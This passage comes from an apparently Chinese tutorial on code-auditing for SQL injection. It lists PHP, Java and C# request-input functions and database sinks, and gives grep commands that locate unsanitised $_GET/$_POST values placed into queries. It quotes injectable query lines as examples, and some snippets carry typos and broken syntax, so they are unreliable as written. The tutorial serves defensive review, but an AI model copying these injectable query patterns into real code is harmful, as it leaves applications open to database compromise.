variable\">$_SERVER</span> 相同，在<span class=\"token constant\">PHP</span> <span class=\"token number\">4.1</span><span class=\"token number\">.0</span> 中已弃用。\n<span class=\"token variable\">$var</span><span class=\"token operator\">=</span><span class=\"token variable\">$HTTP_SERVER_VARS</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'name'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>php.ini中<code>register_globals=On</code>时，将EGPCS（Environment、GET、POST、Cookie、Server）注册成全局变量，已被遗弃并且处于Off状态。</p>\n<h5 id=\"JAVA中HTTP函数\"><a href=\"#JAVA中HTTP函数\" class=\"headerlink\" title=\"JAVA中HTTP函数\"></a>JAVA中HTTP函数</h5><p>HTTP请求对象的类名和接口名称是<code>HTTPServletRequest</code>,引用是写成<code>javax.servlet.HttpServletRequest</code></p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token comment\">//getParameter()\t返回所请求的给定参数的值</span>\n<span class=\"token class-name\">String</span> string_variable <span class=\"token operator\">=</span> request<span class=\"token punctuation\">.</span><span class=\"token function\">getParameter</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"name\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">//getParameterValues()\t以一个数组的方式返回给定参数请求的所有值</span>\n<span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> string_array <span class=\"token operator\">=</span> request<span class=\"token punctuation\">.</span><span class=\"token function\">getParameterValues</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"name\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">//getQueryString()\t返回请求的查询字符串</span>\n<span class=\"token class-name\">String</span> string_variable <span class=\"token operator\">=</span> request<span class=\"token punctuation\">.</span><span class=\"token function\">getQueryString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">//getHeaders()\t返回所请求的头的值</span>\nsting string_variable <span class=\"token operator\">=</span> request<span class=\"token punctuation\">.</span><span class=\"token function\">getHeader</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"User-Agent\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">//getHeaders()\t以一个字符串对象的枚举返回请求头</span>\n<span class=\"token class-name\">Enumeration</span> enumeration_object <span class=\"token operator\">=</span> request<span class=\"token punctuation\">.</span><span class=\"token function\">getHeaders</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"User-Agent\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">//getRequestedSessionld()\t返回客户端指定的 Session ID</span>\n<span class=\"token class-name\">String</span> string_variable <span class=\"token operator\">=</span> request<span class=\"token punctuation\">.</span><span class=\"token function\">getRequestedSessionld</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">//getCookies()\t返回一个cookie对象的数组</span>\n<span class=\"token class-name\">Cookie</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token class-name\">Cookie_array</span> <span class=\"token operator\">=</span> request<span class=\"token punctuation\">.</span><span class=\"token function\">getCookies</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">//cookie.getValue()\t返回所请求的给定cookie的值</span>\n<span class=\"token class-name\">String</span> string_variale <span class=\"token operator\">=</span> <span class=\"token class-name\">Cookie_array</span><span class=\"token punctuation\">.</span><span class=\"token function\">getValue</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"name\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h5 id=\"C-中HTTP函数\"><a href=\"#C-中HTTP函数\" class=\"headerlink\" title=\"C#中HTTP函数\"></a>C#中HTTP函数</h5><pre class=\"line-numbers language-C#\" data-language=\"C#\"><code class=\"language-C#\">//HttpCookieCollection\t所有 cookie 的集合\nHttpCookieCollection variable = Request.Cookies;\n//Form―所有表单值的集合\nstring variable = Request.Form[\"name\"];\n//Headers\t所有头的集合\nstring variable = Request.Headers[\"name\"];\n//Params 所有查询字符串、表单、cookie和服务器变量的组合集\nstring variable = Request.Params[\"name\"];\n//Querystring\t所有查询字符串项的集合\nstring variable = Request.Querystring[\"name\"];\n//Servervariable\t所有Web服务器变量的集合\nstring variable = Request.Servervariables[\"name\"];\n//Url\t返回一个URI类型的对象，其Query属性包含了 URI中的信息，比如?foo=bar\nUri object_variable = Request.Url;\nstring variable = object_variable.Query;\n//UserAgent\t包含浏览器的用户代理头\nstring variable = Request.UserAgent;\n//UserHostAddress\t包含客户端的远程IP地址\nstring variable = Request.UserHostAddress;\n//UserHostName\t 含客户端的远程主机名\nstring variable = Request.UserHostName;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h4 id=\"危险的函数\"><a href=\"#危险的函数\" class=\"headerlink\" title=\"危险的函数\"></a>危险的函数</h4><h5 id=\"PHP\"><a href=\"#PHP\" class=\"headerlink\" title=\"PHP\"></a>PHP</h5><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token comment\">//mssql_query ()\t向当前使用的数据库发送一个查询</span>\n<span class=\"token variable\">$result</span> <span class=\"token operator\">=</span> <span class=\"token function\">mssql_query</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$sql</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">//mysql_query ()\t向当前使用的数据库发送一个查询</span>\n<span class=\"token variable\">$result</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysql_query</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$sql</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">//mysql_db_query ()\t选择一个数据库，在该数据库上执行一个查询</span>\n<span class=\"token variable\">$result</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysql_db_query</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$dbf</span> <span class=\"token variable\">$sql</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">//oci_parse ()\t在语句执行之前对其进行解析</span>\n<span class=\"token variable\">$stmt</span> <span class=\"token operator\">=</span> <span class=\"token function\">oci_parse</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$connection</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$sql</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">ociexecute</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$stmt</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">//ora_parse ()\t在语句执行之前对其进行解析</span>\n<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">ora_parse</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$cursorr</span> <span class=\"token variable\">$sql</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><span class=\"token keyword\">exit</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">}</span>\n<span class=\"token keyword\">else</span> <span class=\"token punctuation\">{</span> <span class=\"token function\">ora_exec</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$cursor</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">}</span>\n<span class=\"token comment\">//mssql_bind ()\t向存储过程添加一个参数</span>\n<span class=\"token function\">mssql_bind</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>stmt<span class=\"token punctuation\">,</span> <span class=\"token number\">1</span>@param<span class=\"token operator\">*</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$variable</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">SQLVARCHAR</span><span class=\"token punctuation\">,</span> <span class=\"token constant boolean\">false</span><span class=\"token punctuation\">,</span> <span class=\"token constant boolean\">false</span><span class=\"token punctuation\">,</span> <span class=\"token number\">100</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$result</span> <span class=\"token operator\">=</span> <span class=\"token function\">mssql_execute</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$stmt</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">//odbc_prepare ()\t准备一条执行语句</span>\n<span class=\"token variable\">$stmt</span> <span class=\"token operator\">=</span> <span class=\"token function\">odbc_prepare</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$db</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$sql</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$result</span> <span class=\"token operator\">=</span> <span class=\"token function\">odbc_execute</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$stmt</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">//odbc_ exec ()\t准备并执行一条SQL语句</span>\n<span class=\"token variable\">$result</span> <span class=\"token operator\">=</span> <span class=\"token function\">odbc_exec</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$db</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$sql</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">//pg_query一执行一个查询(曾称为pg_exec)</span>\n<span class=\"token variable\">$result</span> <span class=\"token operator\">=</span> <span class=\"token function\">pg_query</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$conn</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$sql</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">//pg_exec—*¥兼容性原因依然可用，但建议用户使用新的函数名</span>\n<span class=\"token variable\">$result</span> <span class=\"token operator\">=</span> <span class=\"token function\">pg_exec</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$conn</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$sql</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token operator\">/</span> <span class=\"token operator\">/</span>pg_send_query—发送—异步查询\t乙\n<span class=\"token function\">pg_send_query</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$conn</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$sql</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">//pg_send_query_params一向服务器提交一个命令并分离参数，无须等待结果</span>\n<span class=\"token function\">pg_send_query_params</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$conn</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$sql</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$params</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\">//pg_query_params一向服务器提交一个命令并等待结果</span>\n<span class=\"token function\">pg_query_params</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$conn</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$sql</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$params</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\">//pg_send_prepare一发送一个请求以创建一条具有指定参数的预备语句，无须等待完成</span>\npg <span class=\"token function\">send_prepare</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$conn</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"my_query\"</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">*</span> <span class=\"token constant\">SELECT</span> <span class=\"token operator\">*</span> <span class=\"token constant\">FROM</span> table <span class=\"token constant\">WHERE</span> field <span class=\"token operator\">=</span> <span class=\"token variable\">$11</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token function\">pg_send_execute</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$conn</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"my_query\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$var</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">//pg_pr epare—S送一个请求以劄建一条具有指定参数的预备语句并等待完成</span>\n<span class=\"token function\">pg_prepare</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$connz</span> <span class=\"token string double-quoted-string\">\"my_query\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span> <span class=\"token constant\">SELECT</span> <span class=\"token operator\">*</span> <span class=\"token constant\">FROM</span> table <span class=\"token constant\">WHERE</span> field <span class=\"token operator\">=</span> <span class=\"token variable\">$1</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token function\">pg_execute</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$conn</span><span class=\"token punctuation\">,</span> nmy_query\"<span class=\"token punctuation\">,</span> <span class=\"token variable\">$var</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">//pg_select一根据指定的具有field=&gt;value的assoc_array选择记录</span>\n<span class=\"token variable\">$result</span> <span class=\"token operator\">=</span> <span class=\"token function\">pg_select</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$conn</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$table_name</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$assoc_array</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\">//pg_update (Y—用数据更新与指定条件_的记录</span>\n<span class=\"token function\">pg_update</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$conn</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$arr_update</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$arr_where</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">//pg_insert ()—将 assoc_array 的值插入到 table_name 指定的表中</span>\n<span class=\"token function\">pg_insert</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$conn</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$table_name</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$assoc_array</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\">//pg_delete () 一根据assoc_array中指定的键和值删除表中的记录</span>\n<span class=\"token function\">pg_delete</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$connr</span> <span class=\"token variable\">$table_name</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$assoc_array</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h5 id=\"Java\"><a href=\"#Java\" class=\"headerlink\" title=\"Java\"></a>Java</h5><pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token comment\">//createStatement ()一仓d建一个语句对象以便向数据库发送SQL语句</span>\nstatement <span class=\"token operator\">=</span> connection<span class=\"token punctuation\">.</span><span class=\"token function\">createStatement</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">//prepareStatement () 一创建一条预编译的SQL语句并将其保存到对象中</span>\n<span class=\"token class-name\">PreparedStatement</span> sql <span class=\"token operator\">=</span> con<span class=\"token punctuation\">.</span><span class=\"token function\">prepareStatement</span><span class=\"token punctuation\">(</span>sql<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">//executeQuery () 一 行给定的SQL语句，从指定的表中获取数据</span>\nresult <span class=\"token operator\">=</span> statement<span class=\"token punctuation\">.</span><span class=\"token function\">executeQuery</span><span class=\"token punctuation\">(</span>sql<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">//executeUpdate ()— 行一条SQL语句，该语句可能是一条条返回任何值的INSERT、UPDATE或 //DELETE 语句</span>\nresult <span class=\"token operator\">=</span> statement<span class=\"token punctuation\">.</span><span class=\"token function\">executeUpdate</span><span class=\"token punctuation\">(</span>sql<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">//execute ()— 行给定的SQL语句，从指定的表中获取数据</span>\nresult <span class=\"token operator\">=</span> statement<span class=\"token punctuation\">.</span><span class=\"token function\">execute</span><span class=\"token punctuation\">(</span>sql<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">//addBatch () 一将指定的SQL命令添加到当前命令列表中</span>\nstatement<span class=\"token punctuation\">.</span><span class=\"token function\">addBatch</span><span class=\"token punctuation\">(</span>sql<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\nstatement<span class=\"token punctuation\">.</span><span class=\"token function\">addBatch</span><span class=\"token punctuation\">(</span>more_aql<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h5 id=\"C\"><a href=\"#C\" class=\"headerlink\" title=\"C#\"></a>C#</h5><p>.NET开发使用下列命名空间</p>\n<pre class=\"line-numbers language-C#\" data-language=\"C#\"><code class=\"language-C#\">System.Data.SqlClient： SQL Server 的.NET Framework Data Provider(.NET 框架数据提供程序)\nSystem.Data.OleDb： OLE DB 的.NET Framework Data Provider\nSystem.Data.OracleClient： Oracle 的.NET Framework Data Providero\nSystem.Data.Odbc: ODBC 的.NET Framework Data Provider<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<pre class=\"line-numbers language-C#\" data-language=\"C#\"><code class=\"language-C#\">//SqlCommand()  用于构造或发送SQL语句或存储过程\nSqlCommand command = new SqlCommand(sql, connection);\n//SqlParameter()  用于向 SqlCommand 对象添加参数\nSqlCommand command = new SqlCommand(sql,connection);\ncommand.Parameters.Add(\"@param\", SqlDbType.VarChar, 50).Value = input; \n//OleDbCommand()  用于构造或发送SQL语句或存储过程\nOleDbCommand command = new OleDbCommand(sql,connection);\n//OleDbParameter()  用于向 OleDbCommand 对象添加参数\nOleDvCommand command = new OleDbCommand($sql,connection);\ncommand.parameters.Add(\"@paran\", OleDbType.VarChar, 50).Value = input; \n//OracleCommand()  用于构造/发送SQL语句或存储过程\noracleCommand command = new OracleCommand(sql,connection);\n//OracleParameter()  用于向 OracleCommand 对象添加参数\nOracleCommand command = new OracleCommand(sql,connection); command.Parameters.Add(\"@param\", OleDbType.VarChar,50).Value = input; \n//OdbcCommand()  用于构造或发送SQL语句\nOdbcCommand command = new OdbcCommand(sql,connection);\n//OdbcParameter()  用于向 OdbcCommand 对象添加参数\nOdbcCommand command = new OdbcCommand(sql,connection);\ncommand.Parameters.Add(\"@paramn\",OleDbType.VarChar,50) .Value = input;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h4 id=\"跟踪数据\"><a href=\"#跟踪数据\" class=\"headerlink\" title=\"跟踪数据\"></a>跟踪数据</h4><h5 id=\"跟踪PHP中的数据\"><a href=\"#跟踪PHP中的数据\" class=\"headerlink\" title=\"跟踪PHP中的数据\"></a>跟踪PHP中的数据</h5><p>首先注意到<code>register_globals</code>和<code>magic_quotes</code>的状态</p>\n<p><code>register_globals</code>负责将EGPCS注册成全局变量，<code>magic_qoutes</code>过滤单引号、双引号、反斜线、NULL字符。</p>\n<p>接下来排查代码，搜索php源文件目录，寻找<code>mssql_query()、mysql_query()、mysql_db_query()</code>作用：直接将用户输入插入SQL语句中</p>\n<p>用以下命令打印匹配的内容文件名和行号</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">$ <span class=\"token function\">grep</span> <span class=\"token parameter variable\">-r</span> <span class=\"token parameter variable\">-n</span>\n<span class=\"token string\">\"\\(mysql\\|mssql\\|mysql_db\\)_query\\(.*\\$\\(GET\\|\\POST\\)\"</span>.*<span class=\"token punctuation\">\\</span><span class=\"token punctuation\">)</span><span class=\"token string\">\" src/ | awk -F: '{print \"</span>filename: <span class=\"token string\">\"<span class=\"token variable\">$l</span>\"</span><span class=\"token punctuation\">\\</span>nline: <span class=\"token string\">\"<span class=\"token variable\">$2</span>\"</span><span class=\"token punctuation\">\\</span>nmatch: <span class=\"token string\">\"<span class=\"token variable\">$3</span>\"</span><span class=\"token punctuation\">\\</span>n<span class=\"token punctuation\">\\</span>n<span class=\"token string\">\"}'\nfilename: src/mssql_query.vuln.php\nline: 11\nmatch: <span class=\"token variable\">$result</span> = mssql_query(\"</span>SELECT * FROM TBL WHERE COLUMN <span class=\"token operator\">=</span><span class=\"token string\">'$_GET['</span>var<span class=\"token string\">']'</span><span class=\"token string\">\");\nfilename: src/mysql_query.vuln.php\nline: 13\nmatch: <span class=\"token variable\">$result</span> = mysql_query(\"</span>SELECT * FROM TBL WHERE COLUMN <span class=\"token operator\">=</span> <span class=\"token string\">'$_GET['</span>var<span class=\"token string\">']'</span>\",<span class=\"token variable\">$link</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>寻找<code>oci_parse、ora_parse</code>作用：直接将用户输入插入SQL文件中，优先级大于<code>oci_exec、ora_exec、oci_execute</code></p>\n<p>命令与前面相识</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">$ <span class=\"token function\">grep</span> <span class=\"token parameter variable\">-r</span> <span class=\"token parameter variable\">-n</span>  <span class=\"token string\">\"\\(oci\\|ora\\)_parse\\(.*\\<span class=\"token variable\">$_</span>\\(GET\\|\\POST\\).*\\)\"</span> src/ <span class=\"token operator\">|</span>\n<span class=\"token function\">awk</span> -F: <span class=\"token number\">1</span><span class=\"token punctuation\">{</span>print <span class=\"token string\">\"filename: \"</span><span class=\"token variable\">$l</span><span class=\"token string\">\"<span class=\"token entity\" title=\"\\n\">\\n</span>line: \"</span><span class=\"token variable\">$2</span><span class=\"token string\">\"<span class=\"token entity\" title=\"\\n\">\\n</span>match: \"</span><span class=\"token variable\">$3</span><span class=\"token string\">\"<span class=\"token entity\" title=\"\\n\">\\n</span><span class=\"token entity\" title=\"\\n\">\\n</span>\"</span><span class=\"token punctuation\">}</span><span class=\"token string\">' \nfilename: src/oci_parse.vuln.php\nline: 4\nmatch: $stid = oci_parse($conn, \"SELECT * FROM TABLE WHERE COLUMN = '</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string\">'var1]'</span><span class=\"token string\">\");\nfilename: src/ora_parse.vuln.php\nline: 13\nmatch: ora_parse(<span class=\"token variable\">$curs</span>,\"</span>SELECT * FROM TABLE WHERE COLUMN <span class=\"token operator\">=</span><span class=\"token string\">'$_GET['</span>var<span class=\"token string\">']'</span>\"<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>寻找<code>odbc_prepare()、odbc_exec()</code>作用：直接将用户输入插入SQL文件中，<code>odbc_prepare()</code>先于<code>odbc_execute()</code>被编译成SQL语句</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">$ <span class=\"token function\">grep</span> <span class=\"token parameter variable\">-r</span> <span class=\"token parameter variable\">-n</span> <span class=\"token string\">\"\\(odbc_prepare\\|odbc_exec\\)\\(.*\\<span class=\"token variable\">$_</span>\\(GET\\|\\POST\\).*\\)\"</span> src/ <span class=\"token operator\">|</span> <span class=\"token function\">awk</span> -F: <span class=\"token string\">'{print \"filename: \"$l\"\\nline: \"$2\"\\nmatch: \"$3\"\\n\\n\"}'</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>寻找<code>mssql_bind()</code>作用：直接将用户输入插入到SQL文件中，优先级大于<code>mssql_execute()</code></p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">$ <span class=\"token function\">grep</span> <span class=\"token parameter variable\">-r</span> <span class=\"token parameter variable\">-n</span> <span class=\"token string\">\"mssql_bind\\(.*\\<span class=\"token variable\">$_</span>\\(GET\\|\\POST\\).*\\)\"</span> src/ <span class=\"token operator\">|</span> <span class=\"token function\">awk</span> -F:\n<span class=\"token string\">'{print \"filename: \"$l\"\\nline: \"$2\"\\nmatch: \"$3\"\\n\\n\"}'</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token comment\">#形如</span>\n$<span class=\"token keyword\">sql</span> <span class=\"token operator\">=</span> <span class=\"token string\">\"SELECT * FROM TBL WHERE COLUMN = '$_GET['var']'\"</span><span class=\"token punctuation\">;</span>\n$result <span class=\"token operator\">=</span> mysql_query<span class=\"token punctuation\">(</span>$<span class=\"token keyword\">sql</span><span class=\"token punctuation\">,</span> $link<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<p>上面的命令不能匹配，将上面的命令合并优化得到</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">$ <span class=\"token function\">grep</span> <span class=\"token parameter variable\">-r</span> <span class=\"token parameter variable\">-n</span> <span class=\"token string\">\"mssql_query(\\|mysql_query(\\|mysql_db_query(\\|oci_parse (\\|ora_parse(\\|mssql_bind(\\|mssql_execute(\\|odbc_prepare(\\|odbc_execute (\\|odbc_execute(\\|odbc_exec(\"</span>src/ <span class=\"token operator\">|</span> <span class=\"token function\">awk</span> -F:<span class=\"token string\">'{print\n\"filename: \"$l\"\\nline: \"$2\"\\nmatch: \"$3\"\\n\\n\"}'</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<p>理想获得</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">filename: src/SQLi.MySQL.vulnerable.php\nline: <span class=\"token number\">20</span>\nmatch: <span class=\"token variable\">$result</span> <span class=\"token operator\">=</span> mysql_query<span class=\"token punctuation\">(</span><span class=\"token variable\">$sql</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<p>mysql_query()向数据库发送一条查询，但不知道$sql的值，无法判断是否被污染，所以跟踪$sql变量</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">$ <span class=\"token function\">grep</span> <span class=\"token parameter variable\">-r</span> <span class=\"token parameter variable\">-n</span> <span class=\"token string\">\"\\<span class=\"token variable\">$sql</span>\"</span> src/ 丨 <span class=\"token function\">awk</span> -F: <span class=\"token string\">'{print \"filename: \"$l\"\\nline: \"$2\"\\nmatch: \"$3\"\\n\\n\"}'</span>\n<span class=\"token comment\">#变量可能重用，不采用</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">$ <span class=\"token function\">grep</span> <span class=\"token parameter variable\">-i</span> <span class=\"token parameter variable\">-r</span> <span class=\"token parameter variable\">-n</span> <span class=\"token string\">\"\\<span class=\"token variable\">$sql</span> =.*<span class=\"token entity\" title=\"\\&quot;\">\\\"</span>\\(SELECT\\|UPDATE\\|INSERT\\|DROP\\)\"</span> src/ <span class=\"token operator\">|</span> <span class=\"token function\">awk</span> -F: <span class=\"token string\">'{print \"filename: \"$l\"\\nline: \"$2\"\\nmatch: \"$3\"\\n\\n\"}'</span>\n<span class=\"token comment\">#使用sql语句查找，缩小排查</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<p>理想获得</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">filename: src/SQLi.MySQL.vulnerable.php\nline: <span class=\"token number\">20</span>\nmatch: <span class=\"token variable\">$sql</span> <span class=\"token operator\">=</span> <span class=\"token string\">\"SELECT * FROM table WHERE field = '<span class=\"token variable\">$_GET</span>['input']'\"</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<p>这是可以判断存在SQL注入</p>\n<p>另一种情况</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code 